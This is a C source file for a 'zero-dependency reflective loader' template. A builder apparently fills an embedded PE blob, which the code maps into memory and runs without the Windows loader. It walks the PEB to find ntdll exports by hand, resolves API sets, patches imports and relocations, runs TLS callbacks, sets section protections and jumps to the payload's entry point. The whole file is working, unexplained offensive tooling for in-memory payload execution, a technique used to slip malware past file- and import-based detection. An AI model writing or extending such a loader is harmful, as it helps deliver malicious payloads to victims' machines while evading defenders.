/**
 * loader_template.c - Zero-Dependency Reflective Loader
 */

#ifndef NULL
#define NULL ((void*)0)
#endif

typedef unsigned long long QWORD;
typedef unsigned int DWORD, *PDWORD;
typedef unsigned short WORD, *PWORD;
typedef unsigned char BYTE, *PBYTE;
typedef long long LONG_PTR;
typedef unsigned long long ULONG_PTR;
typedef int LONG, NTSTATUS;
typedef unsigned int ULONG, *PULONG;
typedef unsigned short USHORT;
typedef void *PVOID, *HANDLE, *HMODULE;
typedef unsigned long long SIZE_T, *PSIZE_T;
typedef char CHAR, *PSTR;
typedef const char *LPCSTR;
typedef unsigned short WCHAR, *PWSTR, *PWCHAR;
typedef int BOOL;
typedef unsigned char BOOLEAN;

#define TRUE 1
#define FALSE 0
#define MAX_PATH 260

#define MEM_RESERVE 0x2000
#define MEM_COMMIT 0x1000
#define PAGE_NOACCESS 0x01
#define PAGE_READONLY 0x02
#define PAGE_READWRITE 0x04
#define PAGE_EXECUTE 0x10
#define PAGE_EXECUTE_READ 0x20
#define PAGE_EXECUTE_READWRITE 0x40

#define IMAGE_DIRECTORY_ENTRY_EXPORT 0
#define IMAGE_DIRECTORY_ENTRY_IMPORT 1
#define IMAGE_DIRECTORY_ENTRY_BASERELOC 5
#define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3
#define IMAGE_DIRECTORY_ENTRY_TLS 9

#define IMAGE_REL_BASED_DIR64 10
#define IMAGE_REL_BASED_HIGHLOW 3

#define IMAGE_SCN_MEM_EXECUTE 0x20000000
#define IMAGE_SCN_MEM_WRITE 0x80000000
#define IMAGE_SCN_MEM_READ 0x40000000

#define DLL_PROCESS_ATTACH 1

// Architecture and Calling Convention
#if defined(__x86_64__) || defined(_M_AMD64) || defined(_WIN64)
    #define X64
    #ifdef _MSC_VER
        #define WINABI
    #else
        #define WINABI __attribute__((ms_abi))
    #endif
#else
    #define X86
    #ifdef _MSC_VER
        #define WINABI __stdcall
    #else
        #define WINABI __attribute__((stdcall))
    #endif
#endif

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _ANSI_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PSTR   Buffer;
} ANSI_STRING, *PANSI_STRING;

typedef struct _LIST_ENTRY {
   struct _LIST_ENTRY *Flink;
   struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _IMAGE_DOS_HEADER {
    WORD e_magic;
    WORD e_cblp;
    WORD e_cp;
    WORD e_crlc;
    WORD e_cparhdr;
    WORD e_minalloc;
    WORD e_maxalloc;
    WORD e_ss;
    WORD e_sp;
    WORD e_csum;
    WORD e_ip;
    WORD e_cs;
    WORD e_lfarlc;
    WORD e_ovno;
    WORD e_res[4];
    WORD e_oemid;
    WORD e_oeminfo;
    WORD e_res2[10];
    LONG e_lfanew;
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

typedef struct _IMAGE_FILE_HEADER {
    WORD Machine;
    WORD NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD SizeOfOptionalHeader;
    WORD Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD VirtualAddress;
    DWORD Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

typedef struct _IMAGE_OPTIONAL_HEADER64 {
    WORD Magic;
    BYTE MajorLinkerVersion;
    BYTE MinorLinkerVersion;
    DWORD SizeOfCode;
    DWORD SizeOfInitializedData;
    DWORD SizeOfUninitializedData;
    DWORD AddressOfEntryPoint;
    DWORD BaseOfCode;
    ULONG_PTR ImageBase;
    DWORD SectionAlignment;
    DWORD FileAlignment;
    WORD MajorOperatingSystemVersion;
    WORD MinorOperatingSystemVersion;
    WORD MajorImageVersion;
    WORD MinorImageVersion;
    WORD MajorSubsystemVersion;
    WORD MinorSubsystemVersion;
    DWORD Win32VersionValue;
    DWORD SizeOfImage;
    DWORD SizeOfHeaders;
    DWORD CheckSum;
    WORD Subsystem;
    WORD DllCharacteristics;
    ULONG_PTR SizeOfStackReserve;
    ULONG_PTR SizeOfStackCommit;
    ULONG_PTR SizeOfHeapReserve;
    ULONG_PTR SizeOfHeapCommit;
    DWORD LoaderFlags;
    DWORD NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;

typedef struct _IMAGE_NT_HEADERS64 {
    DWORD Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;

typedef struct _IMAGE_SECTION_HEADER {
    BYTE Name[8];
    union {
        DWORD PhysicalAddress;
        DWORD VirtualSize;
    } Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    union {
        DWORD Characteristics;
        DWORD OriginalFirstThunk;
    };
    DWORD TimeDateStamp;
    DWORD ForwarderChain;
    DWORD Name;
    DWORD FirstThunk;
} IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;

typedef struct _IMAGE_THUNK_DATA64 {
    union {
        ULONG_PTR ForwarderString;
        ULONG_PTR Function;
        ULONG_PTR Ordinal;
        ULONG_PTR AddressOfData;
    } u1;
} IMAGE_THUNK_DATA64, *PIMAGE_THUNK_DATA64;

typedef struct _IMAGE_IMPORT_BY_NAME {
    WORD Hint;
    CHAR Name[1];
} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;

typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD Characteristics;
    DWORD TimeDateStamp;
    WORD MajorVersion;
    WORD MinorVersion;
    DWORD Name;
    DWORD Base;
    DWORD NumberOfFunctions;
    DWORD NumberOfNames;
    DWORD AddressOfFunctions;
    DWORD AddressOfNames;
    DWORD AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;

typedef struct _IMAGE_BASE_RELOCATION {
    DWORD VirtualAddress;
    DWORD SizeOfBlock;
} IMAGE_BASE_RELOCATION, *PIMAGE_BASE_RELOCATION;

typedef struct _RUNTIME_FUNCTION {
    DWORD BeginAddress;
    DWORD EndAddress;
    DWORD UnwindData;
} RUNTIME_FUNCTION, *PRUNTIME_FUNCTION;

typedef struct _IMAGE_TLS_DIRECTORY64 {
    ULONG_PTR StartAddressOfRawData;
    ULONG_PTR EndAddressOfRawData;
    ULONG_PTR AddressOfIndex;
    ULONG_PTR AddressOfCallBacks;
    DWORD SizeOfZeroFill;
    DWORD Characteristics;
} IMAGE_TLS_DIRECTORY64, *PIMAGE_TLS_DIRECTORY64;

typedef struct _API_SET_NAMESPACE {
    ULONG Version;
    ULONG Size;
    ULONG Flags;
    ULONG Count;
    ULONG EntryOffset;
    ULONG HashOffset;
    ULONG HashFactor;
} API_SET_NAMESPACE, *PAPI_SET_NAMESPACE;

typedef struct _API_SET_NAMESPACE_ENTRY {
    ULONG Flags;
    ULONG NameOffset;
    ULONG NameLength;
    ULONG AliasLength;
    ULONG ValueOffset;
    ULONG ValueCount;
} API_SET_NAMESPACE_ENTRY, *PAPI_SET_NAMESPACE_ENTRY;

typedef struct _API_SET_VALUE_ENTRY {
    ULONG Flags;
    ULONG NameOffset;
    ULONG NameLength;
    ULONG ValueOffset;
    ULONG ValueLength;
} API_SET_VALUE_ENTRY, *PAPI_SET_VALUE_ENTRY;

// Function pointer types
typedef NTSTATUS (WINABI *t_LdrLoadDll)(PWSTR, PULONG, PUNICODE_STRING, PVOID*);
typedef NTSTATUS (WINABI *t_LdrGetProcedureAddress)(PVOID, PANSI_STRING, ULONG, PVOID*);
typedef void (WINABI *t_RtlInitAnsiString)(PANSI_STRING, const char*);
typedef NTSTATUS (WINABI *t_RtlAnsiStringToUnicodeString)(PUNICODE_STRING, PANSI_STRING, BOOLEAN);
typedef void (WINABI *t_RtlFreeUnicodeString)(PUNICODE_STRING);
typedef NTSTATUS (WINABI *t_NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (WINABI *t_NtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (WINABI *t_NtFlushInstructionCache)(HANDLE, PVOID, SIZE_T);
typedef NTSTATUS (WINABI *t_NtTerminateProcess)(HANDLE, NTSTATUS);
typedef void (WINABI *t_TLS_CALLBACK)(PVOID, DWORD, PVOID);
typedef BOOL (WINABI *t_RtlAddFunctionTable)(PRUNTIME_FUNCTION, DWORD, QWORD);

#ifdef _MSC_VER
    #include <intrin.h>
    #ifdef X64
        #define READ_PEB() (PVOID)__readgsqword(0x60)
    #else
        #define READ_PEB() (PVOID)__readfsdword(0x30)
    #endif
#else
    #ifdef X64
        static __inline__ PVOID READ_PEB() {
            PVOID peb;
            __asm__ volatile ("movq %%gs:0x60, %0" : "=r" (peb));
            return peb;
        }
    #else
        static __inline__ PVOID READ_PEB() {
            PVOID peb;
            __asm__ volatile ("movl %%fs:0x30, %0" : "=r" (peb));
            return peb;
        }
    #endif
#endif

#define IMAGE_FIRST_SECTION(ntheader) ((IMAGE_SECTION_HEADER*)((char*)(ntheader) + \
    sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + \
    (ntheader)->FileHeader.SizeOfOptionalHeader))

#define IMAGE_SNAP_BY_ORDINAL(ordinal) (((ordinal) & 0x8000000000000000ULL) != 0)
#define IMAGE_ORDINAL(ordinal) ((ordinal) & 0xffff)

// Helper functions
static int my_strlen(const char* s) {
    int l = 0; if (!s) return 0;
    while (s[l]) l++; return l;
}
static int my_strcmp(const char* s1, const char* s2) {
    if (!s1 || !s2) return -1;
    while (*s1 && (*s1 == *s2)) { s1++; s2++; }
    return *(unsigned char*)s1 - *(unsigned char*)s2;
}
static int my_strncmp(const char* s1, const char* s2, SIZE_T n) {
    if (!s1 || !s2) return -1;
    while (n && *s1 && (*s1 == *s2)) { s1++; s2++; n--; }
    if (n == 0) return 0;
    return *(unsigned char*)s1 - *(unsigned char*)s2;
}
static void* my_memcpy(void* dest, const void* src, SIZE_T n) {
    char* d = (char*)dest; const char* s = (const char*)src;
    while (n--) *d++ = *s++; return dest;
}

// Forward declarations
static HMODULE get_module_base_manual(const char* module_name);
static void resolve_api_set(const char* dll_name, char* out_name);
static PVOID get_export_address_manual(HMODULE h_module, const char* func_name, t_RtlInitAnsiString _RtlInitAnsiString, t_LdrGetProcedureAddress _LdrGetProcedureAddress, t_LdrLoadDll _LdrLoadDll, t_RtlAnsiStringToUnicodeString _RtlAnsiStringToUnicodeString, t_RtlFreeUnicodeString _RtlFreeUnicodeString);

static HMODULE get_module_base_manual(const char* module_name) {
    PVOID peb = READ_PEB();
    PPEB_LDR_DATA ldr = *(PPEB_LDR_DATA*)((char*)peb + (sizeof(PVOID) == 8 ? 0x18 : 0x0c));
    PLIST_ENTRY head = &ldr->InLoadOrderModuleList;
    PLIST_ENTRY curr = head->Flink;
    while (curr != head) {
        LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)curr;
        if (module_name == NULL) return (HMODULE)entry->DllBase;
        const char* base_name = module_name;
        PWCHAR entry_name = entry->BaseDllName.Buffer;
        if (entry_name) {
            int match = 1, j = 0;
            while (base_name[j] != '\0') {
                WCHAR c1 = (WCHAR)base_name[j]; WCHAR c2 = entry_name[j];
                if (c1 >= 'A' && c1 <= 'Z') c1 += 32;
                if (c2 >= 'A' && c2 <= 'Z') c2 += 32;
                if (c1 != c2) { match = 0; break; }
                j++;
            }
            if (match && (entry_name[j] == 0 || entry_name[j] == '.')) return (HMODULE)entry->DllBase;
        }
        curr = curr->Flink;
    }
    return NULL;
}

static void resolve_api_set(const char* dll_name, char* out_name) {
    if (my_strncmp(dll_name, "api-", 4) != 0 && my_strncmp(dll_name, "ext-", 4) != 0) {
        int i = 0; while (dll_name[i]) { out_name[i] = dll_name[i]; i++; } out_name[i] = '\0';
        return;
    }
    PVOID peb = READ_PEB();
    PAPI_SET_NAMESPACE api_set_map = *(PAPI_SET_NAMESPACE*)((char*)peb + (sizeof(PVOID) == 8 ? 0x68 : 0x38));
    if (api_set_map->Version < 6) {
        int i = 0; while (dll_name[i]) { out_name[i] = dll_name[i]; i++; } out_name[i] = '\0';
        return;
    }
    API_SET_NAMESPACE_ENTRY* entries = (API_SET_NAMESPACE_ENTRY*)((char*)api_set_map + api_set_map->EntryOffset);
    SIZE_T dll_name_len = (SIZE_T)my_strlen(dll_name);
    if (dll_name_len > 4 && (dll_name[dll_name_len - 4] == '.')) dll_name_len -= 4;
    for (ULONG i = 0; i < api_set_map->Count; i++) {
        API_SET_NAMESPACE_ENTRY* entry = &entries[i];
        PWCHAR name = (PWCHAR)((char*)api_set_map + entry->NameOffset);
        if (dll_name_len == (SIZE_T)entry->NameLength / 2) {
            int match = 1;
            for (SIZE_T j = 0; j < dll_name_len; j++) {
                WCHAR c1 = (WCHAR)dll_name[j]; WCHAR c2 = name[j];
                if (c1 >= 'A' && c1 <= 'Z') c1 += 32;
                if (c2 >= 'A' && c2 <= 'Z') c2 += 32;
                if (c1 != c2) { match = 0; break; }
            }
            if (match) {
                API_SET_VALUE_ENTRY* values = (API_SET_VALUE_ENTRY*)((char*)api_set_map + entry->ValueOffset);
                if (entry->ValueCount > 0) {
                    API_SET_VALUE_ENTRY* value = &values[0];
                    PWCHAR target_dll_wide = (PWCHAR)((char*)api_set_map + value->ValueOffset);
                    ULONG target_dll_len = value->ValueLength / 2;
                    for (ULONG k = 0; k < target_dll_len; k++) out_name[k] = (char)target_dll_wide[k];
                    out_name[target_dll_len] = '\0';
                    return;
                }
            }
        }
    }
    int k = 0; while (dll_name[k]) { out_name[k] = dll_name[k]; k++; } out_name[k] = '\0';
}

static PVOID get_export_address_manual(HMODULE h_module, const char* func_name, t_RtlInitAnsiString _RtlInitAnsiString, t_LdrGetProcedureAddress _LdrGetProcedureAddress, t_LdrLoadDll _LdrLoadDll, t_RtlAnsiStringToUnicodeString _RtlAnsiStringToUnicodeString, t_RtlFreeUnicodeString _RtlFreeUnicodeString) {
    if (!h_module) return NULL;
    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)h_module;
    IMAGE_NT_HEADERS64* nt_headers = (IMAGE_NT_HEADERS64*)((char*)h_module + dos_header->e_lfanew);
    IMAGE_DATA_DIRECTORY export_dir_info = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (export_dir_info.Size == 0) return NULL;
    IMAGE_EXPORT_DIRECTORY* export_dir = (IMAGE_EXPORT_DIRECTORY*)((char*)h_module + export_dir_info.VirtualAddress);
    DWORD* names = (DWORD*)((char*)h_module + export_dir->AddressOfNames);
    DWORD* functions = (DWORD*)((char*)h_module + export_dir->AddressOfFunctions);
    WORD* ordinals = (WORD*)((char*)h_module + export_dir->AddressOfNameOrdinals);
    PVOID addr = NULL;
    if (IMAGE_SNAP_BY_ORDINAL((ULONG_PTR)func_name)) {
        WORD ordinal = (WORD)IMAGE_ORDINAL((ULONG_PTR)func_name) - (WORD)export_dir->Base;
        addr = (PVOID)((char*)h_module + functions[ordinal]);
    } else {
        for (DWORD i = 0; i < export_dir->NumberOfNames; i++) {
            if (my_strcmp(func_name, (char*)h_module + names[i]) == 0) {
                addr = (PVOID)((char*)h_module + functions[ordinals[i]]);
                break;
            }
        }
    }
    if (!addr) return NULL;
    if ((char*)addr >= (char*)export_dir && (char*)addr < (char*)export_dir + export_dir_info.Size) {
        char forward_str[MAX_PATH]; int i = 0;
        while (((char*)addr)[i] != '\0' && i < MAX_PATH - 1) { forward_str[i] = ((char*)addr)[i]; i++; }
        forward_str[i] = '\0';
        char* dot = NULL;
        for (int j = 0; j < i; j++) { if (forward_str[j] == '.') { dot = &forward_str[j]; break; } }
        if (dot) {
            *dot = '\0'; char dll_name[MAX_PATH]; int k = 0;
            while (forward_str[k]) { dll_name[k] = forward_str[k]; k++; }
            int has_ext = 0; for(int m=0; m<k; m++) if(dll_name[m] == '.') has_ext = 1;
            if(!has_ext) { dll_name[k++] = '.'; dll_name[k++] = 'd'; dll_name[k++] = 'l'; dll_name[k++] = 'l'; dll_name[k] = '\0'; }
            else dll_name[k] = '\0';
            char real_dll[MAX_PATH]; resolve_api_set(dll_name, real_dll);
            HMODULE h_forward = get_module_base_manual(real_dll);
            if (!h_forward && _LdrLoadDll && _RtlInitAnsiString && _RtlAnsiStringToUnicodeString && _RtlFreeUnicodeString) {
                ANSI_STRING a_dll; UNICODE_STRING u_dll;
                _RtlInitAnsiString(&a_dll, real_dll);
                _RtlAnsiStringToUnicodeString(&u_dll, &a_dll, TRUE);
                _LdrLoadDll(NULL, NULL, &u_dll, (PVOID*)&h_forward);
                _RtlFreeUnicodeString(&u_dll);
            }
            if (h_forward) return get_export_address_manual(h_forward, dot + 1, _RtlInitAnsiString, _LdrGetProcedureAddress, _LdrLoadDll, _RtlAnsiStringToUnicodeString, _RtlFreeUnicodeString);
        }
    }
    return addr;
}

// Payload info (Replaced by builder)
unsigned char pe_blob[1] = { 0 };
DWORD entry_point_rva = 0;
ULONG_PTR image_base = 0;
SIZE_T size_of_image = 0;

void load_pe() {
    HMODULE h_ntdll = get_module_base_manual("ntdll.dll");
    if (!h_ntdll) return;

    t_RtlInitAnsiString _RtlInitAnsiString = (t_RtlInitAnsiString)get_export_address_manual(h_ntdll, "RtlInitAnsiString", NULL, NULL, NULL, NULL, NULL);
    t_LdrGetProcedureAddress _LdrGetProcedureAddress = (t_LdrGetProcedureAddress)get_export_address_manual(h_ntdll, "LdrGetProcedureAddress", NULL, NULL, NULL, NULL, NULL);
    t_LdrLoadDll _LdrLoadDll = (t_LdrLoadDll)get_export_address_manual(h_ntdll, "LdrLoadDll", NULL, NULL, NULL, NULL, NULL);
    t_RtlAnsiStringToUnicodeString _RtlAnsiStringToUnicodeString = (t_RtlAnsiStringToUnicodeString)get_export_address_manual(h_ntdll, "RtlAnsiStringToUnicodeString", NULL, NULL, NULL, NULL, NULL);
    t_RtlFreeUnicodeString _RtlFreeUnicodeString = (t_RtlFreeUnicodeString)get_export_address_manual(h_ntdll, "RtlFreeUnicodeString", NULL, NULL, NULL, NULL, NULL);
    t_NtAllocateVirtualMemory _NtAllocateVirtualMemory = (t_NtAllocateVirtualMemory)get_export_address_manual(h_ntdll, "NtAllocateVirtualMemory", NULL, NULL, NULL, NULL, NULL);
    t_NtProtectVirtualMemory _NtProtectVirtualMemory = (t_NtProtectVirtualMemory)get_export_address_manual(h_ntdll, "NtProtectVirtualMemory", NULL, NULL, NULL, NULL, NULL);
    t_NtFlushInstructionCache _NtFlushInstructionCache = (t_NtFlushInstructionCache)get_export_address_manual(h_ntdll, "NtFlushInstructionCache", NULL, NULL, NULL, NULL, NULL);
    t_NtTerminateProcess _NtTerminateProcess = (t_NtTerminateProcess)get_export_address_manual(h_ntdll, "NtTerminateProcess", NULL, NULL, NULL, NULL, NULL);

    IMAGE_DOS_HEADER* dos_raw = (IMAGE_DOS_HEADER*)pe_blob;
    IMAGE_NT_HEADERS64* nt_raw = (IMAGE_NT_HEADERS64*)((char*)pe_blob + dos_raw->e_lfanew);
    PVOID pe_buffer = NULL;
    SIZE_T image_sz = (SIZE_T)nt_raw->OptionalHeader.SizeOfImage;
    if (_NtAllocateVirtualMemory) _NtAllocateVirtualMemory((HANDLE)-1, &pe_buffer, 0, &image_sz, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!pe_buffer) return;

    my_memcpy(pe_buffer, pe_blob, (SIZE_T)nt_raw->OptionalHeader.SizeOfHeaders);
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt_raw);
    for (int i = 0; i < nt_raw->FileHeader.NumberOfSections; i++) {
        if (sections[i].PointerToRawData != 0) {
            my_memcpy((char*)pe_buffer + sections[i].VirtualAddress, (char*)pe_blob + sections[i].PointerToRawData, (SIZE_T)sections[i].SizeOfRawData);
        }
    }

    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((char*)pe_buffer + ((IMAGE_DOS_HEADER*)pe_buffer)->e_lfanew);
    IMAGE_DATA_DIRECTORY import_dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (import_dir.Size > 0) {
        IMAGE_IMPORT_DESCRIPTOR* import_desc = (IMAGE_IMPORT_DESCRIPTOR*)((char*)pe_buffer + import_dir.VirtualAddress);
        while (import_desc->Name) {
            char resolved_dll[MAX_PATH];
            resolve_api_set((char*)pe_buffer + import_desc->Name, resolved_dll);
            ANSI_STRING ansi_dll; UNICODE_STRING uni_dll;
            if (_RtlInitAnsiString && _RtlAnsiStringToUnicodeString && _LdrLoadDll && _RtlFreeUnicodeString) {
                _RtlInitAnsiString(&ansi_dll, resolved_dll);
                _RtlAnsiStringToUnicodeString(&uni_dll, &ansi_dll, TRUE);
                HANDLE h_module = NULL;
                _LdrLoadDll(NULL, NULL, &uni_dll, &h_module);
                _RtlFreeUnicodeString(&uni_dll);
                if (h_module) {
                    IMAGE_THUNK_DATA64* first_thunk = (IMAGE_THUNK_DATA64*)((char*)pe_buffer + import_desc->FirstThunk);
                    IMAGE_THUNK_DATA64* original_first_thunk = (IMAGE_THUNK_DATA64*)((char*)pe_buffer + import_desc->OriginalFirstThunk);
                    if (!import_desc->OriginalFirstThunk) original_first_thunk = first_thunk;
                    while (original_first_thunk->u1.AddressOfData) {
                        PVOID addr = NULL;
                        if (IMAGE_SNAP_BY_ORDINAL(original_first_thunk->u1.Ordinal)) {
                            addr = get_export_address_manual((HMODULE)h_module, (char*)original_first_thunk->u1.Ordinal, _RtlInitAnsiString, _LdrGetProcedureAddress, _LdrLoadDll, _RtlAnsiStringToUnicodeString, _RtlFreeUnicodeString);
                        } else {
                            addr = get_export_address_manual((HMODULE)h_module, (char*)((IMAGE_IMPORT_BY_NAME*)((char*)pe_buffer + original_first_thunk->u1.AddressOfData))->Name, _RtlInitAnsiString, _LdrGetProcedureAddress, _LdrLoadDll, _RtlAnsiStringToUnicodeString, _RtlFreeUnicodeString);
                        }
                        first_thunk->u1.Function = (ULONG_PTR)addr;
                        first_thunk++; original_first_thunk++;
                    }
                }
            }
            import_desc++;
        }
    }

    ULONG_PTR delta = (ULONG_PTR)pe_buffer - nt->OptionalHeader.ImageBase;
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY reloc_dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (reloc_dir.Size > 0) {
            IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)((char*)pe_buffer + reloc_dir.VirtualAddress);
            while (reloc->VirtualAddress != 0) {
                DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* list = (WORD*)((char*)reloc + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD i = 0; i < count; i++) {
                    WORD type = list[i] >> 12; WORD offset = list[i] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) *(ULONG_PTR*)((char*)pe_buffer + reloc->VirtualAddress + offset) += delta;
                    else if (type == IMAGE_REL_BASED_HIGHLOW) *(DWORD*)((char*)pe_buffer + reloc->VirtualAddress + offset) += (DWORD)delta;
                }
                reloc = (IMAGE_BASE_RELOCATION*)((char*)reloc + reloc->SizeOfBlock);
            }
        }
    }

#ifdef X64
    IMAGE_DATA_DIRECTORY exception_dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
    if (exception_dir.Size > 0) {
        t_RtlAddFunctionTable _RtlAddFunctionTable = (t_RtlAddFunctionTable)get_export_address_manual(h_ntdll, "RtlAddFunctionTable", NULL, NULL, NULL, NULL, NULL);
        if (_RtlAddFunctionTable) _RtlAddFunctionTable((PRUNTIME_FUNCTION)((char*)pe_buffer + exception_dir.VirtualAddress), exception_dir.Size / sizeof(RUNTIME_FUNCTION), (ULONG_PTR)pe_buffer);
    }
#endif

    IMAGE_DATA_DIRECTORY tls_dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (tls_dir.Size > 0) {
        IMAGE_TLS_DIRECTORY64* tls = (IMAGE_TLS_DIRECTORY64*)((char*)pe_buffer + tls_dir.VirtualAddress);
        t_TLS_CALLBACK* callbacks = (t_TLS_CALLBACK*)tls->AddressOfCallBacks;
        if (callbacks) { while (*callbacks) { (*callbacks)(pe_buffer, DLL_PROCESS_ATTACH, NULL); callbacks++; } }
    }

    sections = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD protection = 0;
        if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE) protection = PAGE_EXECUTE_READWRITE;
            else if (sections[i].Characteristics & IMAGE_SCN_MEM_READ) protection = PAGE_EXECUTE_READ;
            else protection = PAGE_EXECUTE;
        } else {
            if (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE) protection = PAGE_READWRITE;
            else if (sections[i].Characteristics & IMAGE_SCN_MEM_READ) protection = PAGE_READONLY;
            else protection = PAGE_NOACCESS;
        }
        PVOID section_base = (char*)pe_buffer + sections[i].VirtualAddress;
        SIZE_T section_sz = (SIZE_T)sections[i].Misc.VirtualSize;
        ULONG old;
        if (_NtProtectVirtualMemory) _NtProtectVirtualMemory((HANDLE)-1, &section_base, &section_sz, protection, &old);
    }
    if (_NtFlushInstructionCache) _NtFlushInstructionCache((HANDLE)-1, NULL, 0);
    ((void(*)())((char*)pe_buffer + entry_point_rva))();
    if (_NtTerminateProcess) _NtTerminateProcess((HANDLE)-1, 0);
}

int main() {
    load_pe();
    return 0;
}
